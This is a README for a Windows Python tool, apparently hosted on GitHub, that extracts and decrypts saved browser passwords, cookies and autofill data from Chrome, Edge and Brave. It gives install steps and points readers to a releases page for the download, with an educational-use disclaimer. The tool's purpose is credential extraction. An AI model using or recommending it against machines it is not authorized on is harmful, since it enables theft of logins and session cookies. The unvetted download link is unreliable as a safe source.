# 🔐 Browser-Data-Decryption - Unlock Your Browser's Hidden Data

## 🚀 Getting Started

Welcome! This guide will help you download and run the Browser-Data-Decryption script. This tool works on Windows and helps you extract and decrypt passwords, cookies, and autofill data from popular browsers like Chrome, Edge, and Brave. This software is intended for educational purposes or authorized security testing.

## 📥 Download the Application

[![Download Browser-Data-Decryption](https://img.shields.io/badge/Download-Browser--Data--Decryption-blue?style=for-the-badge)](https://github.com/garvvv12/Browser-Data-Decryption/releases)

You can download the latest version of the Browser-Data-Decryption script from the Releases page. This page contains all available versions and any updates.

## 🎯 System Requirements

Before you begin, ensure that your system meets these requirements:

- **Operating System:** Windows 10 or later
- **Python Version:** Python 3.6 or later
- **Additional Libraries:** Ensure the following Python libraries are installed:
  - `chacha20`
  - `pycryptodome`
  - `pywin32`

You can install Python from the official website: [Python.org](https://www.python.org).

## 🛠️ Installation Steps

### 1. Install Python 

If you do not have Python installed, follow these steps:

- Visit the [Python.org download page](https://www.python.org/downloads/).
- Download the appropriate installer for your Windows version.
- Run the installer and make sure to check the option "Add Python to PATH".

### 2. Set Up the Required Libraries

Open Command Prompt:

- Press `Win + R`, type `cmd`, and press `Enter`.

In the Command Prompt window, type the following commands to install the necessary libraries:

```
pip install chacha20
pip install pycryptodome
pip install pywin32
```

### 3. Download the Script

Visit the Releases page to download the latest version of Browser-Data-Decryption:

[Download from Releases Page](https://github.com/garvvv12/Browser-Data-Decryption/releases)

Look for the latest release and click on the asset link to download the file.

### 4. Extract the Files

After downloading, navigate to your Downloads folder. You may find a `.zip` or similar archive file. Right-click the file and select "Extract All." Follow the prompts to extract the contents to a folder of your choice.

### 5. Running the Script

To run the script, you need to access Command Prompt again. Here’s how:

- Open Command Prompt as previously described.
- Navigate to the folder where you extracted the script. Use the `cd` command. For example:

```
cd path\to\your\folder
```

Replace `path\to\your\folder` with the actual path.

- Run the script by typing the following command:

```
python browser_data_decrypt.py
```

Make sure to replace `browser_data_decrypt.py` with the actual name of the script file if it differs.

## 🚀 Using the Application

Once running, the application will guide you through the process. It will attempt to locate your browser data automatically. Follow any on-screen instructions to complete the extraction and decryption of your information.

## 📂 Features

- **Multi-browser Support:** Extract data from Chrome, Edge, and Brave.
- **Secure Decryption:** Uses advanced methods like ChaCha20 for security.
- **User-friendly Interface:** Designed for easy navigation and usage.

## 📝 Important Notes

- **For Educational Use Only:** Please use this tool responsibly. It is designed for educational purposes or authorized security testing only.
- **No Guarantees:** The script may not always work perfectly on every machine or version of the browsers. Results can vary based on browser updates or security settings.

## 🚧 Troubleshooting

If you encounter issues:

- Ensure you have the proper versions of Python and required libraries.
- Check that your browser is updated and has saved data for extraction.
- Consult the documentation on the GitHub page for additional support.

## 🌐 Get Support

For any questions or support needs, you can create an issue in the GitHub repository. We encourage you to describe your issue in detail to get the best assistance.

---

Thank you for using Browser-Data-Decryption! You now have the steps to download and run the application. Enjoy exploring your browser data safely and responsibly.